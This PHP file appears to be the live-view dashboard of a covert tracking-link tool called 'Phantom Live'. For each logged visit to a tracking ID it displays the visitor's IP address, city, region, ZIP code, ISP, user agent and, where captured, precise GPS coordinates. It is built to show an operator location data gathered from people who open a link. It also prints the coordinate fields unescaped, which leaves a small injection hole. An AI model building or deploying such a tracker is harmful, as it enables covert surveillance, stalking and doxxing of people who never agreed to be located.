<?php
// liveview.php
$config = require __DIR__ . '/config.php';
$id = isset($_GET['id']) ? preg_replace('/[^a-zA-Z0-9_-]/', '', $_GET['id']) : '';
$logFile = __DIR__ . '/logs/' . $id . '.json';
$logs = file_exists($logFile) ? json_decode(file_get_contents($logFile), true) : [];
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>Phantom Live – <?= htmlspecialchars($id) ?></title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body{background:#0b0b0f;color:#ddd;font-family:system-ui;margin:0;padding:20px}
h1{color:#8b5cf6}
.card{background:#16161f;border:1px solid #2a2a3a;border-radius:12px;padding:16px;margin:12px 0}
.ip{color:#22d3ee;font-weight:600}
.badge{display:inline-block;padding:2px 8px;border-radius:999px;font-size:12px;background:#312e81;color:#c4b5fd}
table{width:100%;border-collapse:collapse}
td,th{padding:8px;border-bottom:1px solid #2a2a3a;text-align:left;font-size:14px}
</style>
</head>
<body>
<h1>👻 Phantom Live</h1>
<p>Tracking ID: <code><?= htmlspecialchars($id) ?></code> · <?= count($logs) ?> hits</p>

<?php foreach (array_reverse($logs) as $i => $log): ?>
<div class="card">
  <div><span class="badge">#<?= count($logs)-$i ?></span> <?= htmlspecialchars($log['time']) ?></div>
  <p class="ip"><?= htmlspecialchars($log['ip']) ?></p>
  <p><?= htmlspecialchars($log['geo']['city'] ?? '') ?>, <?= htmlspecialchars($log['geo']['region'] ?? '') ?>, <?= htmlspecialchars($log['geo']['country'] ?? '') ?></p>
  <p>ZIP: <?= htmlspecialchars($log['geo']['zip'] ?? '-') ?> · ISP: <?= htmlspecialchars($log['geo']['isp'] ?? '-') ?></p>
  <?php if (!empty($log['precise']['lat'])): ?>
  <p>📍 Precise: <?= $log['precise']['lat'] ?>, <?= $log['precise']['lon'] ?> (±<?= $log['precise']['accuracy'] ?? '?' ?>m)</p>
  <?php endif; ?>
  <details>
    <summary>UA & details</summary>
    <pre style="font-size:12px;overflow:auto"><?= htmlspecialchars($log['ua']) ?></pre>
  </details>
</div>
<?php endforeach; ?>

<?php if (empty($logs)): ?>
<p>Belum ada hit.</p>
<?php endif; ?>
</body>
</html>
